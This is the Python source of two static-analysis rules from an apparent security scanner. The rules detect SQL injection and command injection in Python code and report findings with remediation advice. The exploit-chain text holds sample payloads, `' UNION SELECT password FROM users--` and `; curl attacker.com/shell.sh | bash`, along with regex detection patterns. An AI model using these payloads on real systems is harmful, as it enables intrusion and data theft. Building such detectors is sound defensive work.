from __future__ import annotations

import re

from sentinel.core.context import AuditContext
from sentinel.models.finding import Confidence, ExploitChainStep, Finding, Location, Severity
from sentinel.rules.base import BaseRule, RuleMetadata

_ANALYZER = "sentinel.rules.builtin.injection"

# Patterns for unsafe SQL construction in Python
_SQL_PATTERNS = [
    re.compile(r'\.execute\s*\(\s*["\'].*%[sd]', re.IGNORECASE),
    re.compile(r'\.execute\s*\(\s*f["\']', re.IGNORECASE),
    re.compile(r'\.execute\s*\(\s*["\'].*\s*\+\s*', re.IGNORECASE),
    re.compile(r'\.raw\s*\(\s*f["\']', re.IGNORECASE),
    re.compile(r'\.raw\s*\(\s*["\'].*%[sd]', re.IGNORECASE),
    re.compile(r'text\s*\(\s*f["\']', re.IGNORECASE),
]

# Patterns for unsafe shell execution in Python
_CMD_PATTERNS = [
    re.compile(r'os\.system\s*\(\s*f["\']', re.IGNORECASE),
    re.compile(r'os\.system\s*\(\s*["\'].*%[sd]', re.IGNORECASE),
    re.compile(r"os\.system\s*\(\s*[^\)]*\+", re.IGNORECASE),
    re.compile(r'subprocess\.\w+\s*\(\s*f["\']', re.IGNORECASE),
    re.compile(r"shell\s*=\s*True", re.IGNORECASE),
    re.compile(r'Popen\s*\(\s*f["\']', re.IGNORECASE),
]


class SQLInjectionRule(BaseRule):
    metadata = RuleMetadata(
        id="INJ-001",
        title="SQL Injection via String Formatting",
        description="SQL query built with f-string, % formatting, or + concatenation. Potentially user-controlled.",
        severity="critical",
        confidence="medium",
        cwe_ids=["CWE-89"],
        tags=["injection", "sql", "database"],
        languages=["python"],
    )

    async def match(self, ctx: AuditContext) -> list[Finding]:
        findings: list[Finding] = []

        for rel_path, content in ctx.file_contents.items():
            lang = ctx.file_metadata.get(rel_path, {}).get("language")
            if lang != "python":
                continue

            for line_no, line in enumerate(content.splitlines(), start=1):
                matched = next((p for p in _SQL_PATTERNS if p.search(line)), None)
                if not matched:
                    continue

                findings.append(
                    Finding(
                        title="SQL Injection via String Formatting",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.MEDIUM,
                        affected_components=[rel_path],
                        locations=[Location(file=rel_path, line_start=line_no)],
                        attack_surface="Database query execution via user-controlled input",
                        exploitation_requirements=(
                            "Attacker can influence any variable interpolated into the SQL string"
                        ),
                        technical_explanation=(
                            f"`{rel_path}:{line_no}` constructs a SQL query using string formatting. "
                            "If any interpolated variable originates from user input or external data, "
                            "this is directly exploitable for SQL injection."
                        ),
                        root_cause=(
                            "Raw string concatenation/formatting used instead of parameterized queries"
                        ),
                        attack_scenario=(
                            "Attacker submits SQL metacharacters in an input field "
                            "(e.g., `' OR 1=1--`), escaping the intended query structure."
                        ),
                        exploit_chain=[
                            ExploitChainStep(
                                step=1,
                                component="User Input",
                                action="Supply payload: `' UNION SELECT password FROM users--`",
                            ),
                            ExploitChainStep(
                                step=2,
                                component=rel_path,
                                action=f"Input inserted into raw SQL string at line {line_no}",
                            ),
                            ExploitChainStep(
                                step=3,
                                component="Database",
                                action="Modified query executes, returning or modifying arbitrary data",
                            ),
                        ],
                        potential_impact=(
                            "Full database read/write, authentication bypass, data exfiltration, "
                            "potential RCE via xp_cmdshell or INTO OUTFILE"
                        ),
                        blast_radius="All data accessible by the database user running the application",
                        detection_difficulty="Easy to detect automatically; bypass possible via encoding",
                        business_risk="Data breach, compliance violation (PCI/GDPR), regulatory penalties",
                        mitigation_strategy=(
                            "Use parameterized queries or ORM-provided safe query builders exclusively. "
                            "Never build SQL strings from user data."
                        ),
                        secure_refactor_recommendations=[
                            "Replace `cursor.execute(f'... {var}')` with `cursor.execute('...?', (var,))`",
                            "Use SQLAlchemy ORM or `text()` with `bindparams()`",
                            "Enforce repository pattern that never accepts raw SQL strings",
                        ],
                        safer_architectural_alternative=(
                            "Enforce DB access through a typed repository layer. "
                            "No raw SQL strings ever leave the repository module."
                        ),
                        verification_notes=(
                            f"Trace the variable in the format expression at line {line_no} "
                            "back to its origin. Confirm whether any user-supplied path reaches it."
                        ),
                        tags=["injection", "sql", "CWE-89"],
                        cwe_ids=["CWE-89"],
                        analyzer=_ANALYZER,
                        rule_id="INJ-001",
                    )
                )
                break  # one finding per line

        return findings


class CommandInjectionRule(BaseRule):
    metadata = RuleMetadata(
        id="INJ-002",
        title="Command Injection via Unsafe Shell Execution",
        description="Shell command constructed from dynamic data or executed with shell=True.",
        severity="critical",
        confidence="medium",
        cwe_ids=["CWE-78"],
        tags=["injection", "command", "shell"],
        languages=["python"],
    )

    async def match(self, ctx: AuditContext) -> list[Finding]:
        findings: list[Finding] = []

        for rel_path, content in ctx.file_contents.items():
            lang = ctx.file_metadata.get(rel_path, {}).get("language")
            if lang != "python":
                continue

            for line_no, line in enumerate(content.splitlines(), start=1):
                matched = next((p for p in _CMD_PATTERNS if p.search(line)), None)
                if not matched:
                    continue

                findings.append(
                    Finding(
                        title="Command Injection Risk",
                        severity=Severity.CRITICAL,
                        confidence=Confidence.MEDIUM,
                        affected_components=[rel_path],
                        locations=[Location(file=rel_path, line_start=line_no)],
                        attack_surface="OS shell command execution with potentially attacker-influenced input",
                        exploitation_requirements=(
                            "Attacker controls any part of the command string or subprocess arguments"
                        ),
                        technical_explanation=(
                            f"`{rel_path}:{line_no}` uses unsafe shell execution. "
                            "String-formatted commands or `shell=True` with external data "
                            "allows injection of arbitrary shell commands."
                        ),
                        root_cause="User-controlled data passed to shell without sanitization or argument isolation",
                        attack_scenario=(
                            "Attacker injects shell metacharacters (`;`, `&&`, `|`, backtick) "
                            "into a user-controlled field to execute arbitrary OS commands."
                        ),
                        exploit_chain=[
                            ExploitChainStep(
                                step=1,
                                component="User Input",
                                action="Supply: `; curl attacker.com/shell.sh | bash`",
                            ),
                            ExploitChainStep(
                                step=2,
                                component=rel_path,
                                action=f"Input embedded in shell string at line {line_no}",
                            ),
                            ExploitChainStep(
                                step=3,
                                component="OS",
                                action="Arbitrary command executes with application process privileges",
                            ),
                        ],
                        potential_impact="Remote code execution, full server compromise, lateral movement",
                        blast_radius="Entire host and every network resource reachable from it",
                        detection_difficulty="Moderate — WAF-bypassable; depends on input sanitization",
                        business_risk="Complete system compromise, data exfiltration, ransomware delivery vector",
                        mitigation_strategy=(
                            "Pass command arguments as a list to subprocess with `shell=False`. "
                            "Never interpolate user data into shell strings."
                        ),
                        secure_refactor_recommendations=[
                            "Replace `os.system(cmd)` with `subprocess.run(['cmd', arg], shell=False)`",
                            "Never use `shell=True` with any externally influenced data",
                            "Use `shlex.quote()` only as a last resort when shell string is unavoidable",
                        ],
                        analyzer=_ANALYZER,
                        rule_id="INJ-002",
                        cwe_ids=["CWE-78"],
                        tags=["injection", "command", "CWE-78"],
                    )
                )
                break

        return findings
